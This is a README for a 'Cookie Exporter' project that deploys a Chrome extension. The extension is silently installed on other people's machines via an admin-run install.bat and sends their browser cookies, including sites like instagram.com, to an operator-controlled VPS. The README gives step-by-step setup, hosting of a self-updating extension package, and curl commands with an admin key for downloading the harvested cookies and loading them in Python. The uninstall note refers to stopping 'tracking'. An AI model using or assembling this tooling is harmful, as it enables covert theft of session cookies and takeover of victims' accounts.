# Cookie Exporter

## Project Structure
```
cookie-exporter/
├── extension/          # Chrome extension (deployed to server)
│   ├── manifest.json
│   ├── background.js
│   └── update.xml
├── server/             # FastAPI server (deployed to VPS)
│   ├── main.py
│   └── requirements.txt
├── install.bat         # User runs this (one-time)
├── setup-server.sh    # You run this on VPS (one-time)
└── hacker/            # Conda environment (local dev only)
```

## Setup Steps

### 1. Get a VPS
Buy a cheap VPS ($4-5/month) from DigitalOcean, Hetzner, or Vultr.

### 2. Set your keys
Replace these placeholders in ALL files:
- `YOUR_SERVER_URL` → your VPS IP/domain (e.g., `http://123.45.67.89:8000`)
- `YOUR_UPLOAD_KEY` → any secret string (e.g., `upload-k3y-s3cr3t`)
- `YOUR_ADMIN_KEY` → different secret string (e.g., `admin-k3y-pr1vat3`)

### 3. Deploy server
SSH into your VPS and run:
```bash
bash setup-server.sh
```

### 4. Pack the extension as .crx
On your local machine with Chrome:
1. Go to chrome://extensions
2. Enable Developer Mode
3. Click "Pack extension" → select the `extension/` folder
4. This generates `extension.crx` — upload it to your server

### 5. Host extension files on server
Make sure your server serves these URLs:
- `http://YOUR_SERVER_URL/extension.crx`
- `http://YOUR_SERVER_URL/update.xml`
- `http://YOUR_SERVER_URL/extension/manifest.json`
- `http://YOUR_SERVER_URL/extension/background.js`

### 6. Distribute install.bat
Send `install.bat` to your teammates. They run it as admin → done.

## Admin Usage

### Download cookies as .pkl
```bash
curl -H "x-admin-key: YOUR_ADMIN_KEY" http://YOUR_SERVER_URL/api/cookies -o cookies.pkl
```

### View cookies as JSON
```bash
curl -H "x-admin-key: YOUR_ADMIN_KEY" http://YOUR_SERVER_URL/api/cookies/json
```

### Load cookies in Python
```python
import pickle
with open("cookies.pkl", "rb") as f:
    cookies = pickle.load(f)
# cookies = {"instagram.com": {url, domain, cookies: [...]}, ...}
```

## Uninstall (for users)
Send `uninstall.bat` to the user. They run it as admin → extension is removed permanently, no more tracking.
